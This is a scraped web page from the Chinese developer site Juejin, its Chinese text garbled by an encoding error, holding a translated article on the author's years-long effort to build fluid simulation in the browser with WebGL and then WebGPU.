<p>2026æ³¨å®šæ˜¯å¤§æ¨¡å‹æ¥ç»­çˆ†å‘çš„ä¸€å¹´ï¼ä¸ºäº†è®©å¤§å®¶å½»åº•ææ‡‚å¤§æ¨¡å‹çš„ä½œç”¨åŸç†ï¼Œç¬”è€…ä¹Ÿå‘å¸ƒäº†<a href="https://juejin.cn/column/7594655863548248116" target="_blank" title="https://juejin.cn/column/7594655863548248116">ã€Šæ•°æ®åˆ°æ¨¡å‹åˆ°åº”ç”¨ï¼šå¤§æ¨¡å‹è®­ç»ƒå…¨æµç¨‹å®æˆ˜æŒ‡å—ã€‹</a>ä¸“æ ï¼Œé¢„è®¡ä¼šæœ‰50æœŸå†…å®¹ï¼Œå°†ç³»ç»Ÿæ‹†è§£ä»æ•°æ®å¤„ç†ã€æ¨¡å‹è®­ç»ƒåˆ°å¼ºåŒ–å­¦ä¹ ä¸æ™ºèƒ½ä½“å¼€å‘çš„å…¨æµç¨‹ï¼Œå¹¶å¸¦å¤§å®¶ä»é›¶å®ç°æ¨¡å‹ï¼Œå¸®åŠ©å¤§å®¶æŒæ¡å¤§æ¨¡å‹è®­ç»ƒçš„å…¨æŠ€èƒ½ï¼ŒçœŸæ­£æŒæ¡å¡‘é€ æ™ºèƒ½çš„èƒ½åŠ›ï¼æ„Ÿå…´è¶£å¤§å®¶å¯å…³æ³¨ç¬”è€…æ˜é‡‘è´¦å·ï¼Œæ›´å¯å…³æ³¨ç¬”è€…åŒåå¾®ä¿¡å…¬ä¼—å·ï¼š<strong>å¤§æ¨¡å‹çœŸå¥½ç©</strong>ï¼Œæ›´å¤šæ•™ç¨‹å’Œå¤§é‡å¤§æ¨¡å‹å­¦ä¹ èµ„æ–™åˆ†äº«~</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šå¤§æ¨¡å‹è®­ç»ƒå¯¹è®¡ç®—èµ„æºæœ‰ä¸€å®šè¦æ±‚ï¼Œå°¤å…¶æ˜¯GPUæ˜¾å­˜ã€‚ä¸ºé™ä½å­¦ä¹ é—¨æ§›ï¼Œç¬”è€…ä¸å›½å†…ä¸»æµäº‘å¹³å°åˆä½œï¼Œå¤§å®¶å¯ä»¥é€šè¿‡æ‰“å¼€é“¾æ¥:Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.lab4ai.cn%2Fregister%3FagentID%3Duser-XorgKKc56U" target="_blank" title="https://www.lab4ai.cn/register?agentID=user-XorgKKc56U" ref="nofollow noopener noreferrer">Lab4AI</a>Â ï¼Œä½“éªŒ<strong>H100 GPU 6.5å°æ—¶</strong>çš„ç®—åŠ›ã€‚æœ¬ç³»åˆ—æ‰€æœ‰å®æˆ˜æ•™ç¨‹å‡å°†åœ¨è¯¥å¹³å°ä¸Šå®Œæˆï¼Œå¸®åŠ©å¤§å®¶ä½æˆæœ¬ä¸Šæ‰‹å®è·µã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ¬¡ WebGPU æµä½“ä¹‹æ—…]]></title>    <link>https://juejin.cn/post/7602544700475031562</link>    <guid>https://juejin.cn/post/7602544700475031562</guid>    <pubDate>2026-02-04T03:42:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602544700475031562" data-draft-id="7602512226999500850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ¬¡ WebGPU æµä½“ä¹‹æ—…"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,JavaScript"/> <meta itemprop="datePublished" content="2026-02-04T03:42:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘å®‰ä¸œå°¼"/> <meta itemprop="url" content="https://juejin.cn/user/1521379823340792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ¬¡ WebGPU æµä½“ä¹‹æ—…
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379823340792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘å®‰ä¸œå°¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T03:42:52.000Z" title="Wed Feb 04 2026 03:42:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    66
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftympanus.net%2Fcodrops%2F2025%2F01%2F29%2Fparticles-progress-and-perseverance-a-journey-into-webgpu-fluids%2F" target="_blank" title="https://tympanus.net/codrops/2025/01/29/particles-progress-and-perseverance-a-journey-into-webgpu-fluids/" ref="nofollow noopener noreferrer">Particles, Progress, and Perseverance: A Journey into WebGPU Fluids</a></p>
<p>ä½œè€…ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftympanus.net%2Fcodrops%2Fauthor%2Fhector%2F" target="_blank" title="https://tympanus.net/codrops/author/hector/" ref="nofollow noopener noreferrer">Hector Arellano</a></p>
<p>æ—¥æœŸï¼š2025å¹´1æœˆ29æ—¥</p>
<p>ç¿»è¯‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN" target="_blank" title="https://github.com/TUARAN" ref="nofollow noopener noreferrer">TUARAN</a></p>
</blockquote>
<blockquote>
<p>æ¬¢è¿å…³æ³¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN%2Ffrontend-weekly-digest-cn" target="_blank" title="https://github.com/TUARAN/frontend-weekly-digest-cn" ref="nofollow noopener noreferrer">å‰ç«¯å‘¨åˆŠ</a>ï¼Œæ¯å‘¨æ›´æ–°å›½å¤–è®ºå›çš„å‰ç«¯çƒ­é—¨æ–‡ç« ï¼Œç´§è·Ÿæ—¶äº‹ï¼ŒæŒæ¡å‰ç«¯æŠ€æœ¯åŠ¨æ€ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66a8f7b9d2d741bd8bb08aabe1c5e1aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770793485&amp;x-signature=%2BWk7ZnAXLhS03OdQS9rk8t%2FT0g0%3D" alt="image.png" loading="lazy"/></p>
<p>æœ¬æ–‡æ˜¯ä¸€æ®µå›é¡¾å¼çš„é•¿æ—…ç¨‹ï¼šä½œè€…ç”¨åå¤šå¹´çš„æ—¶é—´ä¸æ–­å°è¯•â€œæµè§ˆå™¨é‡Œåšæµä½“â€ï¼Œä» WebGL æ—¶ä»£çš„å„ç§ Hackï¼Œä¸€è·¯èµ°åˆ° WebGPU è®©è®¸å¤šâ€œç°ä»£å›¾å½¢ API èƒ½åŠ›â€å˜å¾—å¯ç”¨ã€‚</p>
<ul>
<li>Demoï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftympanus.net%2FTutorials%2FWebGPUFluid%2F" target="_blank" title="https://tympanus.net/Tutorials/WebGPUFluid/" ref="nofollow noopener noreferrer">tympanus.net/Tutorials/Wâ€¦</a></li>
<li>Codeï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHectorArellanoDev%2FWebGPUFluids" target="_blank" title="https://github.com/HectorArellanoDev/WebGPUFluids" ref="nofollow noopener noreferrer">github.com/HectorArellâ€¦</a></li>
</ul>
<p>ç¼–è€…æŒ‰ï¼šå¦‚æœä½ å…³æ³¨è¿‡ Web å›¾å½¢åœˆå­ï¼Œå¯èƒ½çŸ¥é“ Hector Arellanoï¼ˆåˆå <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fhector_arellano" target="_blank" title="https://x.com/hector_arellano" ref="nofollow noopener noreferrer">Hat</a>ï¼‰ã€‚è¿™ç¯‡æ–‡ç« ä¸ä»…æ˜¯æŠ€æœ¯æ‹†è§£ï¼Œæ›´æ˜¯ä¸€æ®µå…³äºåšæŒã€è¯•é”™ã€ä¸ Web å›¾å½¢æ¼”è¿›çš„æ•…äº‹ã€‚</p>
<p>æ³¨æ„ï¼šDemo ä¾èµ– <strong>WebGPU</strong>ï¼Œå¹¶éæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒã€‚è¯·ä½¿ç”¨æ”¯æŒ WebGPU çš„æµè§ˆå™¨ï¼ˆä¾‹å¦‚æœ€æ–°ç‰ˆ Chrome / Edgeï¼Œå¹¶ç¡®ä¿ WebGPU å·²å¯ç”¨ï¼‰ã€‚</p>
<p>åœ¨ç»§ç»­é˜…è¯»ä¹‹å‰â€¦â€¦å…ˆå»æ‹¿æ¯å–çš„â€”â€”<em>è¿™ç¯‡å¾ˆé•¿</em>ã€‚</p>
<h2 data-id="heading-0">13 å¹´å‰â€¦â€¦</h2>
<p>æˆ‘æ­£ç›¯ç€ç”µè„‘å±å¹•å‘å‘†ï¼ˆæ— èŠå¾—å¾ˆï¼‰ï¼Œä¸€ä¸ªå¾ˆè¦å¥½çš„æœ‹å‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FSirokos" target="_blank" title="https://x.com/Sirokos" ref="nofollow noopener noreferrer">Felix</a> æ‰“ç”µè¯ç»™æˆ‘ï¼Œéå¸¸è®¤çœŸåˆå…´å¥‹åœ°è¯´ï¼šGathering Party åˆšå‘å¸ƒäº†ä¸€ä¸ª<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DLTOC_ajkRkU" target="_blank" title="https://www.youtube.com/watch?v=LTOC_ajkRkU" ref="nofollow noopener noreferrer">æ–° Demo</a>ã€‚å®ƒæœ‰æµä½“æ¨¡æ‹Ÿã€ç²’å­åŠ¨ç”»ã€æƒŠè‰³çš„ç€è‰²æ–¹æ¡ˆâ€”â€”æœ€é‡è¦çš„æ˜¯ï¼Œå®ƒçœŸçš„å¾ˆç¾ã€‚</p>
<p>é‚£æ—¶å€™ WebGL è¿˜ç®—â€œæ–°ä¸œè¥¿â€ï¼ŒæŠŠç¡¬ä»¶åŠ é€Ÿçš„ 3D å›¾å½¢å¸¦è¿›æµè§ˆå™¨ï¼Œçœ‹èµ·æ¥ä¼šæ‰“å¼€å¾ˆå¤šé—¨ã€‚æˆ‘å¤©çœŸåœ°ä»¥ä¸ºï¼šWebGL ä¹Ÿè®¸èƒ½åšå‡º Felix ç»™æˆ‘çœ‹çš„é‚£ç§ä¸œè¥¿ã€‚</p>
<p>ä½†æˆ‘å¼€å§‹ç ”ç©¶é‚£ä¸ª Demo çš„å®ç°æ–¹å¼æ—¶ï¼Œå°±æ’ä¸Šäº†æ®‹é…·ç°å®ï¼šé‡Œé¢ç”¨åˆ°äº†ä¸€å †æˆ‘ä»æ²¡å¬è¿‡çš„ API/ç‰¹æ€§â€”â€”â€œAtomicsï¼ˆåŸå­æ“ä½œï¼‰â€â€œIndirect Draw Callsï¼ˆé—´æ¥ç»˜åˆ¶è°ƒç”¨ï¼‰â€â€œIndirect Dispatchï¼ˆé—´æ¥æ´¾å‘ï¼‰â€â€œStorage Buffersï¼ˆå­˜å‚¨ç¼“å†²åŒºï¼‰â€â€œCompute Shadersï¼ˆè®¡ç®—ç€è‰²å™¨ï¼‰â€â€œ3D Texturesï¼ˆä¸‰ç»´çº¹ç†ï¼‰â€ã€‚</p>
<p>å®ƒä»¬å±äºç°ä»£å›¾å½¢ API çš„èƒ½åŠ›ï¼Œä½†åœ¨å½“æ—¶çš„ WebGL é‡ŒåŸºæœ¬ä¸å­˜åœ¨ã€‚</p>
<p>æ›´åˆ«æå®ƒè¿˜ç”¨äº†å¾ˆå¤šå¬èµ·æ¥å°±å¾ˆå¤æ‚çš„ç®—æ³•/æŠ€æœ¯ï¼šç”¨ <strong>SPHï¼ˆSmoothed Particle Hydrodynamicsï¼Œå¹³æ»‘ç²’å­æµä½“åŠ¨åŠ›å­¦ï¼‰</strong> é©±åŠ¨ç²’å­åŠ¨ç”»ã€ç”¨ <strong>histopyramids</strong> åšæµå‹ç¼©ï¼ˆæˆ‘å½“æ—¶è¿˜æƒ³ï¼šæˆ‘ä¸ºä»€ä¹ˆéœ€è¦è¿™ä¸ªï¼Ÿï¼‰ã€ç”¨ GPU ä¸Šçš„ <strong>marching cubes</strong>ï¼ˆä»ç²’å­ç”Ÿæˆä¸‰è§’å½¢ï¼Ÿï¼Ÿï¼Ÿï¼‰ç­‰ç­‰ã€‚</p>
<p>æˆ‘å®Œå…¨ä¸çŸ¥é“ä»å“ªé‡Œå¼€å§‹ã€‚æ›´ç³Ÿçš„æ˜¯ï¼ŒFelix è·Ÿæˆ‘æ‰“èµŒï¼šè¿™ç§æµä½“æ•ˆæœä¸å¯èƒ½åœ¨æµè§ˆå™¨é‡Œâ€œå¯ç”¨äºç”Ÿäº§â€ã€‚</p>
<h2 data-id="heading-1">10 å¹´å‰â€¦â€¦</h2>
<p>åˆè¿‡äº†ä¸‰å¹´ï¼ŒFelix è¯´ä»–è¿˜æœ‰ä¸€ä¸ª<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Di8hSZGTXTx8" target="_blank" title="https://www.youtube.com/watch?v=i8hSZGTXTx8" ref="nofollow noopener noreferrer">æ›´ç‚¸è£‚çš„ Demo</a>ä¸€å®šè¦æˆ‘çœ‹ã€‚é™¤äº†æµä½“æ¨¡æ‹Ÿï¼Œå®ƒè¿˜ç”¨å®æ—¶å…‰çº¿è¿½è¸ªæ¸²æŸ“äº†å‡ ä½•ä½“â€”â€”æè´¨å¾ˆéœ‡æ’¼ã€ç”»é¢å¾ˆæƒŠäººã€‚</p>
<p>è¿™ä¸‹æŒ‘æˆ˜æ›´å¤§äº†ï¼šæˆ‘ä¸ä»…æƒ³æ¨¡æ‹Ÿæµä½“ï¼Œæˆ‘è¿˜æƒ³ç”¨å…‰è¿½å»æ¸²æŸ“å®ƒï¼Œå¾—åˆ°æ¼‚äº®çš„åå°„ä¸æŠ˜å°„ã€‚</p>
<p>æˆ‘èŠ±äº†å¤§æ¦‚ 3 å¹´æ‰æŠŠè¿™äº›ä¸œè¥¿ç†è§£åˆ°èƒ½åœ¨ WebGL é‡Œâ€œç¡¬å‡¿â€å‡ºæ¥ï¼š</p>
<ul>
<li>æˆ‘ç”¨ SPH è®©ç²’å­è¡Œä¸ºåƒæµä½“ï¼›</li>
<li>æˆ‘ç”¨ marching cubes ä»ç²’å­ç”Ÿæˆç½‘æ ¼ï¼ˆè§å›¾ 1 çš„æè¿°ï¼‰ã€‚</li>
</ul>
<p>å½“æ—¶æ²¡æœ‰ atomicsï¼Œæˆ‘å°±ç”¨å¤šæ¬¡ draw call æŠŠæ•°æ®å¡è¿›çº¹ç†çš„ RGBA é€šé“æ¥â€œåˆ†å±‚â€ï¼›æ²¡æœ‰ storage buffer å’Œ 3D çº¹ç†ï¼Œæˆ‘å°±ç”¨çº¹ç†å­˜æ•°æ®ï¼Œå¹¶ç”¨äºŒç»´å±‚æ¥â€œæ¨¡æ‹Ÿâ€ 3D çº¹ç†ï¼›æ²¡æœ‰ indirect drawï¼Œæˆ‘å°±å¹²è„†æŒ‰é¢„æœŸæ•°é‡å‘èµ· draw callï¼›æ²¡æœ‰ compute shaderï¼Œæˆ‘å°±ç”¨é¡¶ç‚¹ç€è‰²å™¨åš GPGPU çš„æ•°æ®é‡æ’â€¦â€¦è™½ç„¶ä¹Ÿåšä¸å‡ºé‚£ç§â€œåœ¨ buffer é‡Œéšæ„å†™å¤šä¸ªå†…å­˜ä½ç½®â€çš„äº‹ï¼Œä½†è‡³å°‘æˆ‘èƒ½åœ¨ GPU é‡Œç”Ÿæˆä¸€ä¸ªåŠ é€Ÿç»“æ„ã€‚</p>
<p>å®ç°æ˜¯èƒ½è·‘ï¼Œä½†ç¦»â€œç¾â€å·®å¾—å¾ˆè¿œï¼ˆFelix ç›´æ¥è¯„ä»·ï¼šä¸‘ã€‚ç¡®å®ä¸‘ï¼Œä½ å¯ä»¥æƒ³è±¡å›¾ 2ï¼‰ã€‚æˆ‘é‚£æ—¶ä¹Ÿä¸å¤ªæ‡‚è·ç¦»åœºï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆæŠŠ shading åšå¾—æ›´æœ‰è¶£ï¼ŒåŸºæœ¬å°±æ˜¯è€æ´¾ phongã€‚</p>
<p>æ€§èƒ½ä¹Ÿé™åˆ¶äº†å¾ˆå¤šé«˜çº§æ•ˆæœï¼šç¯å¢ƒå…‰é®è”½ã€æ›´å¤æ‚çš„åå°„æŠ˜å°„â€¦â€¦ä½†è‡³å°‘æˆ‘èƒ½æ¸²æŸ“å‡ºç‚¹ä¸œè¥¿ã€‚</p>
<h2 data-id="heading-2">7 å¹´å‰â€¦â€¦</h2>
<p>å†è¿‡ä¸‰å¹´ï¼Œæˆ‘åˆåšäº†ä¸€äº›è¿›å±•ï¼šå®ç°äº†ä¸€ä¸ªæ··åˆå¼å…‰è¿½ã€‚æ€è·¯æ˜¯ï¼šmarching cubes å…ˆç”Ÿæˆä¸‰è§’å½¢ï¼Œç„¶åç”¨å…‰è¿½å»ç®—äºŒæ¬¡å°„çº¿åšåå°„/æŠ˜å°„ï¼›åŒä¸€ä¸ªå…‰è¿½è¿˜èƒ½éå†åŠ é€Ÿç»“æ„å»åšç„¦æ•£ã€‚è¿™äº›åŸºæœ¬éƒ½æ²¿ç”¨äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmattswoboda" target="_blank" title="https://x.com/mattswoboda" ref="nofollow noopener noreferrer">Matt Swoboda</a> çš„æƒ³æ³•ï¼ˆé‚£äº› Demo çš„åŸä½œè€…ï¼‰ã€‚æˆ‘çš„å·¥ä½œå¤§éƒ¨åˆ†å°±æ˜¯ï¼šæŠŠä»–çš„ç‚¹å­å°½é‡åœ¨ WebGL é‡Œè·‘èµ·æ¥ï¼ˆç¥ä½ å¥½è¿ï¼‰ã€‚</p>
<p>æ•ˆæœåœ¨è§†è§‰ä¸Šè¿˜ä¸é”™ï¼ˆç±»ä¼¼å›¾ 3ï¼‰ï¼Œä½†éœ€è¦éå¸¸å¼ºçš„ GPUã€‚å½“æ—¶æˆ‘ç”¨çš„æ˜¯ NVidia 1080GTXã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šå³ä½¿ WebGL å¯è¡Œï¼Œä¹Ÿä¸å¯èƒ½æ‹¿å»åšâ€œç”Ÿäº§â€ã€‚æ‰‹æœºä¸è¡Œï¼Œæ™®é€šç¬”è®°æœ¬ä¹Ÿæ‰›ä¸ä½ã€‚</p>
<p>çœ‹å¾—åˆ°â€œç»“æœâ€ï¼Œå´ç”¨ä¸åˆ°çœŸå®é¡¹ç›®é‡Œï¼Œè¿™ç§æŒ«è´¥æ„Ÿå¾ˆå¼ºã€‚æˆ‘èŠ±äº†å¤ªå¤šæ—¶é—´ï¼Œæœ€åä¹Ÿæ²¡æœ‰è¾¾åˆ°æœŸæœ›ã€‚è‡³å°‘ï¼Œè¿™å¥—ä»£ç åº“è¿˜èƒ½ç»§ç»­å¸®æˆ‘å­¦ä¹ ã€‚</p>
<p>äºæ˜¯æˆ‘åœäº†ã€‚</p>
<p>Felix èµ¢äº†èµŒå±€ã€‚</p>
<p>è¿™æ®µé“ºå«å¯¹ä¸€ç¯‡â€œæ•™ç¨‹â€æ¥è¯´å¤ªé•¿äº†ï¼Œä½†æˆ‘æƒ³æŠŠèƒŒæ™¯äº¤ä»£æ¸…æ¥šï¼šæœ‰äº› Demo çœ‹èµ·æ¥åƒâ€œå‡ å¤©æå®šâ€ï¼Œå®é™…å¯èƒ½æ˜¯å¤šå¹´ç§¯ç´¯ï¼›ä½ è¦èŠ±æ—¶é—´å­¦å¾ˆå¤šæŠ€æœ¯ï¼Œä¹Ÿç»å¸¸è¦å€Ÿé‰´åˆ«äººçš„æƒ³æ³•â€”â€”æœ€åä¹Ÿå¯èƒ½ä»ç„¶å¤±è´¥ã€‚</p>
<h2 data-id="heading-3">WebGPU ç™»åœº</h2>
<p>è¿˜è®°å¾—é‚£äº›â€œç°ä»£å›¾å½¢ API çš„å…³é”®è¯â€å—ï¼ŸWebGPU åŸºäºç°ä»£ API æ ‡å‡†ï¼Œè¿™æ„å‘³ç€æˆ‘ä¸å¿…å†é  Hackï¼š</p>
<ul>
<li>æˆ‘å¯ä»¥ç”¨ compute shader ç›´æ¥æ“ä½œ storage bufferï¼›</li>
<li>æˆ‘å¯ä»¥ç”¨ atomics åšé‚»åŸŸæœç´¢ã€æµå‹ç¼©æ—¶çš„ç´¢å¼•å†™å…¥ï¼›</li>
<li>æˆ‘å¯ä»¥ç”¨ dispatch indirect æ¥åªç”Ÿæˆå¿…è¦æ•°é‡çš„ä¸‰è§’å½¢ï¼Œå¹¶ç”¨åŒæ ·çš„æ–¹å¼ç»˜åˆ¶å®ƒä»¬ã€‚</li>
</ul>
<p>æˆ‘æƒ³å­¦ä¹  WebGPUï¼Œäºæ˜¯å†³å®šæŠŠä¹‹å‰çš„æµä½“å·¥ä½œè¿ç§»è¿‡æ¥ï¼Œé¡ºä¾¿ç†è§£æ–°èŒƒå¼ï¼šæ€ä¹ˆç»„ç»‡ pipeline å’Œ bindingã€æ€ä¹ˆç®¡ç† GPU å†…å­˜ä¸èµ„æºâ€¦â€¦åšä¸€ä¸ªå° Demo å¾ˆé€‚åˆç»ƒæ‰‹ã€‚</p>
<p>éœ€è¦å…ˆè®²æ¸…æ¥šï¼šæœ¬æ–‡çš„ Demo <strong>å¹¶ä¸é€‚åˆç”Ÿäº§</strong>ã€‚åœ¨ M3 Max è¿™ç±»æ¯”è¾ƒå¼ºçš„ MacBook Pro ä¸Šå®ƒå¯èƒ½èƒ½è·‘åˆ° 120fpsï¼›M1 Pro ä¸Šå¤§æ¦‚ 60fpsï¼›å…¶å®ƒä¸é”™çš„æœºå™¨ä¹Ÿè®¸ 50fpsâ€¦â€¦ä½†å¦‚æœä½ æ‹¿å»è·‘åœ¨ MacBook Air ä¸Šï¼Œâ€œæµè§ˆå™¨æµä½“æ¢¦â€ä¼šå¾ˆå¿«ç ´ç¢ã€‚</p>
<p>é‚£å®ƒä¸ºä»€ä¹ˆä»ç„¶æœ‰ä»·å€¼ï¼Ÿ</p>
<p>å› ä¸ºå®ƒå…¶å®æ˜¯ä¸€ç»„å¯æ‹†è§£çš„æŠ€æœ¯é›†åˆã€‚ä½ å¯èƒ½å¯¹å…¶ä¸­æŸä¸ªéƒ¨åˆ†æ„Ÿå…´è¶£ï¼šç²’å­åŠ¨ç”»ã€ä»åŠ¿åœºç”Ÿæˆè¡¨é¢ï¼ˆé¿å… ray marchingï¼‰ã€é—´æ¥å…‰ã€ä¸–ç•Œç©ºé—´ AOâ€¦â€¦ä½ å¯ä»¥æŠŠä»“åº“é‡Œçš„ä»£ç æ‹¿å‡ºæ¥ï¼Œåªå–ä½ éœ€è¦çš„éƒ¨åˆ†æ¥æ„å»ºè‡ªå·±çš„æƒ³æ³•ã€‚</p>
<p>è¿™ä¸ª Demo å¤§è‡´å¯ä»¥æ‹†æˆ 4 ä¸ªä¸»è¦é˜¶æ®µï¼š</p>
<ul>
<li><strong>æµä½“æ¨¡æ‹Ÿ</strong>ï¼šç”¨ç²’å­æ¨¡æ‹Ÿï¼ˆåŸºäº Position Based Dynamics æ€è·¯ï¼‰é©±åŠ¨æµä½“çš„è¿åŠ¨ã€‚</li>
